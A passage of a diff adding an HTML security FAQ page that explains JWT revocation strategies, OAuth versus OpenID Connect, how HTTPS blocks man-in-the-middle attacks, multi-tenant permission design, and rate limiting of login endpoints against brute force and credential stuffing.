+  <strong>1. Short expiry (simplest)</strong>: JWTs expire in 15 minutes. A compromised token is only valid for 15 minutes maximum. Combined with refresh token rotation (each refresh invalidates the previous refresh token), the attack window is small. Acceptable for most applications.<br><br>
+  <strong>2. Token version in JWT + DB check</strong>: store a <code>token_version</code> in the user table. When user changes password, increment <code>token_version</code>. JWT payload includes <code>token_version</code>. On each request, verify JWT signature AND check that <code>token_version</code> in JWT matches DB. One DB lookup per request — but this is a cache-able lookup (Redis with TTL matching JWT expiry).<br><br>
+  <strong>3. Blocklist in Redis</strong>: on logout/password change, add <code>jti</code> (JWT ID claim — unique UUID per token) to a Redis SET with TTL equal to remaining JWT lifetime. On each request: verify signature + check <code>SISMEMBER blocklist {jti}</code>. Immediate revocation, but one Redis lookup per request. Fully stateless is now partially stateful — but Redis lookup is sub-millisecond.</div></div>
+  <div class="faq-item"><div class="faq-q" onclick="toggle(this)">What is the difference between OAuth and OpenID Connect (OIDC)?<span class="tog">+</span></div>
+  <div class="faq-a"><strong>OAuth 2.0 is an authorisation framework. OIDC is an identity layer on top of OAuth 2.0.</strong><br><br>
+  OAuth 2.0 answers: "Can this app access this resource on the user's behalf?" It issues access tokens scoped to resources (e.g., read your Google Drive). It does NOT tell you who the user is — the access token is intentionally opaque.<br><br>
+  OpenID Connect adds: "Who is the user?" On top of the OAuth flow, OIDC issues an ID token (a JWT) containing the user's identity claims: sub (subject/user ID), email, name, picture. This is what "Sign in with Google" actually uses — OIDC, not pure OAuth.<br><br>
+  <strong>Rule of thumb</strong>: use OAuth 2.0 when you need to access APIs on behalf of a user. Use OIDC when you need to know who the user IS (authentication). In practice, most "Sign in with X" flows are OIDC. Most "access my X data" flows are OAuth. Many flows combine both.</div></div>
+  <div class="faq-item"><div class="faq-q" onclick="toggle(this)">How does HTTPS prevent a man-in-the-middle attack?<span class="tog">+</span></div>
+  <div class="faq-a"><strong>HTTPS prevents MITM through certificate validation — the attacker cannot forge a valid certificate for your domain.</strong><br><br>
+  Scenario without HTTPS: attacker sits between client and server, intercepts all traffic, reads/modifies it freely.<br><br>
+  With HTTPS: when the attacker intercepts, they must present a certificate to the client. The certificate must be signed by a trusted CA AND match the domain name. The attacker cannot get a certificate for google.com because:<br>
+  (1) CAs require proof of domain control (they send a challenge to the domain's DNS or web server).<br>
+  (2) Certificate Transparency (CT) logs: all issued certificates are publicly logged. If an attacker somehow gets a cert for your domain, you'd see it in CT logs (Google monitors these).<br>
+  (3) HSTS (HTTP Strict Transport Security): browser refuses to connect without valid HTTPS even if certificate presented is "valid" looking.<br><br>
+  The weakness: if the attacker can install their own root CA in the system's trust store (e.g., corporate proxy, malware), they CAN do MITM. Certificate pinning (mobile apps pin the expected certificate fingerprint) provides additional protection.</div></div>
+  <div class="faq-item"><div class="faq-q" onclick="toggle(this)">How do you design a permissions system for a multi-tenant SaaS application?<span class="tog">+</span></div>
+  <div class="faq-a"><strong>Multi-tenant permissions require isolation at the data level, not just the application level.</strong><br><br>
+  <strong>Tenant isolation</strong>: every database query must include a tenant_id filter. Option A: row-level security in PostgreSQL — every table has tenant_id, RLS policy enforces it automatically (even if app forgets to filter). Option B: separate database per tenant (physical isolation, highest security, operationally expensive).<br><br>
+  <strong>Role hierarchy within a tenant</strong>: Tenant Admin → can manage users, billing, all resources. Team Admin → can manage their team's users and resources. Member → can access assigned resources. Viewer → read-only. Implement with RBAC: roles are scoped to (tenant_id, user_id, role_name).<br><br>
+  <strong>Resource-level permissions</strong>: for fine-grained access (user A can edit document X but not document Y), use a permission table: <code>(tenant_id, resource_id, resource_type, user_id, permission)</code>. Check permissions on every resource access. Cache in Redis with TTL to avoid DB lookup on every API call.<br><br>
+  <strong>The critical failure mode</strong>: forgetting to scope a query to the current tenant. User from Tenant A sees Tenant B's data. This is a tenant data leakage bug — catastrophic for a SaaS business. Mitigation: integration tests that verify cross-tenant isolation, code review checklist for every new query.</div></div>
+  <div class="faq-item"><div class="faq-q" onclick="toggle(this)">How do you rate-limit authentication endpoints to prevent brute-force attacks?<span class="tog">+</span></div>
+  <div class="faq-a"><strong>Authentication endpoints need multi-dimensional rate limiting because standard per-IP limits are too easily bypassed.</strong><br><br>
+  <strong>Per-IP rate limiting</strong>: 10 login attempts per minute per IP. Basic protection. Bypassed by: distributed attacks (thousands of IPs), shared IPs (corporate proxies where many users share one IP).<br><br>
+  <strong>Per-account rate limiting</strong>: 5 failed attempts per account per 15 minutes regardless of IP. After 5 failures: temporary lockout + email notification to account owner. This prevents distributed brute-force against one account from different IPs. Risk: denial of service (attacker locks out legitimate users). Mitigation: exponential backoff lockout (30s, 1min, 5min, 30min) rather than permanent lockout.<br><br>
+  <strong>Credential stuffing detection</strong>: if the same password is tried across many accounts (from a leaked credential list), detect the pattern: high failed login rate across many accounts + same password hash. Block the specific password + require CAPTCHA for affected accounts. Tools: Have I Been Pwned API to check if credentials are in known breach data.<br><br>
+  <strong>Production pattern</strong>: Redis counters with sliding window. Key: <code>login:fail:ip:{hash(ip)}</code> and <code>login:fail:account:{user_id}</code>. Both must pass. Prometheus metrics on login failure rates. Alert when failure rate spikes — indicates an attack in progress.</div></div>
+</section></div>
+<div class="footer">SECURITY · JWT · OAUTH · TLS · RBAC · XSS · CSRF · SSRF · ZERO TRUST · MANISH-ALMANAC</div>
+<script>function toggle(el){el.parentElement.classList.toggle('open');}</script>
+</body></html>
